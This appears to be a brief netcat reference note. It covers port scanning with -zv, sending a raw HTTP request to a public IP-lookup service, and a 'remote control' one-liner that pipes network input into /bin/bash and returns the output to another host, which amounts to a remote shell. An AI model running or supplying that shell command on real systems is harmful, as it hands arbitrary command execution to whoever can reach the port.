# Netcat

PORT SCANNING
The -z flag can be used to tell nc to report open ports, rather than initiate a connection. Usually it's useful to turn on verbose output to stderr by use this option in conjunction with -v option.
```
$ nc -zv 192.168.0.1 1-1024 2>&1 | grep "succeeded"
```

TALKING TO SERVERS
```
echo "GET / HTTP/1.1\r\nHost: api.ipify.org\r\n\r\n" -n | nc -N api.ipify.org 80
```

REMOTE CONTROL
```
nc -l 5000 | /bin/bash 2>&1 | nc 192.168.0.39 5001
```